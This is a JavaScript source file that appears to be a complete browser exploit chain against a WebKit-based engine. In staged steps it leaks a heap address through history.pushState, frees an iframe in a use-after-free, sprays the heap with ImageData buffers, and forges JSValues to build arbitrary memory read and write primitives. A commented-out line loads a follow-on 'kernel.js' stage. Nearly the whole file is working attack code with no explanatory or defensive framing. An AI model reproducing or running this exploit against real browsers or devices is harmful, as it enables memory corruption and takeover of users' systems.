/////////////////// UTILITY STUFF ///////////////////

function makeid() {
  var text = "";
  var possible = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
    
  for( var i=0; i < 8; i++ )
  text += possible.charAt(Math.floor(Math.random() * possible.length));
    
  return text;
};

var instancespr = [];

for(var i=0; i<2048; i++) {
  instancespr[i] = {};
  instancespr[i][makeid()] = 50057; /* spray 4-field Object InstanceIDs */
}
for(var i=2048; i<4096; i++) {
  instancespr[i] = new Uint32Array(1);
  instancespr[i][makeid()] = 50057; /* spray 4-field Object InstanceIDs */
}

var _dview;

function u2d(low, hi) {
  if (!_dview) _dview = new DataView(new ArrayBuffer(16));
  _dview.setUint32(0, hi);
  _dview.setUint32(4, low);
  return _dview.getFloat64(0);
}

function int64(low,hi) {
  this.low = (low>>>0);
  this.hi = (hi>>>0);

  this.add32inplace = function(val) {
    var new_lo = (((this.low >>> 0) + val) & 0xFFFFFFFF) >>> 0;
    var new_hi = (this.hi >>> 0);

    if (new_lo < this.low) {
      new_hi++;
    }

    this.hi=new_hi;
    this.low=new_lo;
  }

  this.add32 = function(val) {
    var new_lo = (((this.low >>> 0) + val) & 0xFFFFFFFF) >>> 0;
    var new_hi = (this.hi >>> 0);

    if (new_lo < this.low) {
      new_hi++;
    }

    return new int64(new_lo, new_hi);
  }

  this.sub32 = function(val) {
    var new_lo = (((this.low >>> 0) - val) & 0xFFFFFFFF) >>> 0;
    var new_hi = (this.hi >>> 0);

    if (new_lo > (this.low) & 0xFFFFFFFF) {
      new_hi--;
    }

    return new int64(new_lo, new_hi);
  }

  this.sub32inplace = function(val) {
    var new_lo = (((this.low >>> 0) - val) & 0xFFFFFFFF) >>> 0;
    var new_hi = (this.hi >>> 0);

    if (new_lo > (this.low) & 0xFFFFFFFF) {
      new_hi--;
    }

    this.hi=new_hi;
    this.low=new_lo;
  }

  this.and32 = function(val) {
    var new_lo = this.low & val;
    var new_hi = this.hi;
    return new int64(new_lo, new_hi);
  }

  this.and64 = function(vallo, valhi) {
    var new_lo = this.low & vallo;
    var new_hi = this.hi & valhi;
    return new int64(new_lo, new_hi);
  }

  this.toString = function(val) {
    val = 16;
    var lo_str = (this.low >>> 0).toString(val);
    var hi_str = (this.hi >>> 0).toString(val);

    if(this.hi == 0)
      return lo_str;
    else
      lo_str = zeroFill(lo_str, 8)

    return hi_str+lo_str;
  }

  this.toPacked = function() {
    return {hi: this.hi, low: this.low};
  }

  this.setPacked = function(pck) {
    this.hi=pck.hi;
    this.low=pck.low;
    return this;
  }
    
  return this;
}

function zeroFill(number, width ) {
    width -= number.toString().length;

    if (width > 0) {
        return new Array(width + (/\./.test( number ) ? 2 : 1)).join('0') + number;
    }

    return number + ""; // always return a string
}

var nogc = [];

/////////////////// STAGE 1: INFOLEAK ///////////////////

failed = false

// Spray a bunch of JSObjects on the heap for stability
for(var i = 0; i < 0x4000; i++) {
  nogc.push({a: 0, b: 0, c: 0, d: 0});
}

// Target JSObject for overlap
var tgt = {a: 0, b: 0, c: 0, d: 0}

for(var i = 0; i < 0x400; i++) {
  nogc.push({a: 0, b: 0, c: 0, d: 0});
}

var y = new ImageData(1, 0x4000)
postMessage("", "*", [y.data.buffer]);

// Spray properties to ensure object is fastmalloc()'d and can be found easily later
var props = {};

for(var i = 0; (i < (0x4000 / 2));) {
  props[i++] = {value: 0x42424242};
  props[i++] = {value: tgt};
}

// Find address of JSValue by leaking one of the JSObject's we sprayed
var foundLeak   = undefined;
var foundIndex  = 0;
var maxCount    = 0x100;

// Only check 256 times, should rarely fail
while(foundLeak == undefined && maxCount > 0) {
  maxCount--;

  history.pushState(y, "");

  Object.defineProperties({}, props);

  var leak = new Uint32Array(history.state.data.buffer);

  // Check memory against known values such as 0x42424242 JSValue and empty JSObject values
  for(var i = 0; i < leak.length - 6; i++) {
    if(
      leak[i]       == 0x42424242 &&
      leak[i + 0x1] == 0xFFFF0000 &&
      leak[i + 0x2] == 0x00000000 &&
      leak[i + 0x3] == 0x00000000 &&
      leak[i + 0x4] == 0x00000000 &&
      leak[i + 0x5] == 0x00000000 &&
      leak[i + 0x6] == 0x0000000E &&
      leak[i + 0x7] == 0x00000000 &&
      leak[i + 0xA] == 0x00000000 &&
      leak[i + 0xB] == 0x00000000 &&
      leak[i + 0xC] == 0x00000000 &&
      leak[i + 0xD] == 0x00000000 &&
      leak[i + 0xE] == 0x0000000E &&
      leak[i + 0xF] == 0x00000000
    ) {
      foundIndex = i;
      foundLeak = leak;
      break;
    }
  }
}

// Oh no :(
if(!foundLeak) {
  failed = true
  fail("Failed to find leak!")
}

// Get first JSValue
var firstLeak = Array.prototype.slice.call(foundLeak, foundIndex, foundIndex + 0x40);
var leakJSVal = new int64(firstLeak[8], firstLeak[9]);
leakJSVal.toString();

// Spray and clear 
for(var i = 0; i < 0x4000; i++) {
  var lol = {a: 0, b: 0, c: 0, d: 0};
}

// Force garbage collection via memory pressure
var dgc = function() {
  for (var i = 0; i < 0x100; i++) {
    new ArrayBuffer(0x100000);
  }
}

/////////////////// STAGE 2: UAF ///////////////////

// Userland pwnage
function exploit() {
  if(failed) {
    return;
  }

  try {
    var src = document.createAttribute('src');
    src.value = 'javascript:parent.callback()';
      
    var d = document.createElement('div');

    // Sandwich our target iframe
    for(var i = 0; i < 0x4000; i++) {
      nogc.push(document.createElement('iframe'));
    }

    var f = document.body.appendChild(document.createElement('iframe'));

    for(var i = 0; i < 0x4000; i++) {
      nogc.push(document.createElement('iframe'));
    }

    // Free the iframe!
    window.callback = () => {
      window.callback = null;
      
      d.setAttributeNodeNS(src);
      f.setAttributeNodeNS(document.createAttribute('src'));
    };

    f.name = "lol";
    f.setAttributeNodeNS(src);
    f.remove();
    
    f = null;
    src = null;
    nogc.length=0;
    dgc();

    /////////////////// STAGE 3: HEAP SPRAY ///////////////////

    // Setup spray variables
    var objSpray  = 0x10000;
    var objSz     = 0x90;
    var objs      = new Array(objSpray);

    // Spray the heap with MarkedArgumentBuffers to corrupt iframe JSObject's backing memory. ImageData does this well.
    for(var i = 0; i < objSpray; i++) {
      objs[i] = new ImageData(1, objSz / 4);
    }

    for(var i = 0; i < objSpray; i++) {
      objs[i] = new Uint32Array(objs[i].data.buffer);
    }

    /////////////////// STAGE 4: MISALIGNING JSVALUES ///////////////////

    var craftptr = leakJSVal.sub32(0x10000 - 0x10)
    tgt.b = u2d(0,craftptr.low); // 0x10000 is offset due to double encoding
    tgt.c = craftptr.hi;
    tgt.a = u2d(2048, 0x1602300);

    /////////////////// STAGE 3 - CONTINUED ///////////////////

    // Memory corruption ; not even once!
    for (var i=0; i<objSpray; i++)
    {
      // The poor butterflies :(
      objs[i][2] = leakJSVal.low + 0x18 + 4;
      objs[i][3] = leakJSVal.hi;
    }

    /////////////////// STAGE 5: READ/WRITE PRIMITIVE ///////////////////

    // Retrieve stale reference and setup primitive helpers
    var stale   = d.attributes[0].ownerElement;
    var master  = new Uint32Array(0x1000);
    var slave   = new Uint32Array(0x1000);
    var leakval_u32     = new Uint32Array(0x1000);
    var leakval_helper  = [slave, 2, 3, 4, 5, 6, 7, 8, 9, 10];

    // Create fake ArrayBufferView
    tgt.a = u2d(4096, 0x1602300);
    tgt.b = 0;
    tgt.c = leakval_helper;
    tgt.d = 0x1337;

    // Save old butterfly
    var butterfly = new int64(stale[2], stale[3]);

    // Set leakval_u32's vector to leakval_helper's butterfly
    tgt.c = leakval_u32;
    var lkv_u32_old = new int64(stale[4], stale[5]);
    
    stale[4] = butterfly.low;
    stale[5] = butterfly.hi;

    // Setup read/write primitive
    tgt.c = master;
    stale[4] = leakval_u32[0];
    stale[5] = leakval_u32[1];
    
    var addr_to_slavebuf = new int64(master[4], master[5]);
    tgt.c = leakval_u32;
    stale[4] = lkv_u32_old.low;
    stale[5] = lkv_u32_old.hi;

    // Restore proper JSValues
    for (var i=0; i<objSpray; i++)
    {
      objs[i][2] = 0x41414141;
      objs[i][3] = 0xFFFF0000;
    }

    // Don't need these anymore
    tgt.c = 0;
    stale = 0;

    // Primitives :D
    var prim = {
      write8: function(addr, val) {
        master[4] = addr.low;
        master[5] = addr.hi;

        if (val instanceof int64) {
          slave[0] = val.low;
          slave[1] = val.hi;
        } else {
          slave[0] = val;
          slave[1] = 0;
        }

        master[4] = addr_to_slavebuf.low;
        master[5] = addr_to_slavebuf.hi;
      },

      write4: function(addr, val) {
        master[4] = addr.low;
        master[5] = addr.hi;

        slave[0] = val;

        master[4] = addr_to_slavebuf.low;
        master[5] = addr_to_slavebuf.hi;
      },

      read8: function(addr) {
        master[4] = addr.low;
        master[5] = addr.hi;

        var rtv = new int64(slave[0], slave[1]);

        master[4] = addr_to_slavebuf.low;
        master[5] = addr_to_slavebuf.hi;

        return rtv;
      },

      read4: function(addr)
      {
        master[4] = addr.low;
        master[5] = addr.hi;

        var rtv = slave[0];

        master[4] = addr_to_slavebuf.low;
        master[5] = addr_to_slavebuf.hi;

        return rtv;
      },

      leakval: function(jsval)
      {
        leakval_helper[0] = jsval;
        var rtv = this.read8(butterfly);
        this.write8(butterfly, new int64(0x41414141, 0xffffffff));
          
        return rtv;
      },

      createval: function(jsval)
      {
        this.write8(butterfly, jsval);
        var rt = leakval_helper[0];
        this.write8(butterfly, new int64(0x41414141, 0xffffffff));
        return rt;
      }
    };

    window.primitives = prim;

    postExploit();
  } catch(e) {
    failed = true
    fail("Exception: " + e)
  }

  /*setTimeout(function() {
    sc = document.createElement("script");
    sc.src="kernel.js";
    document.body.appendChild(sc);
  }, 100);*/
}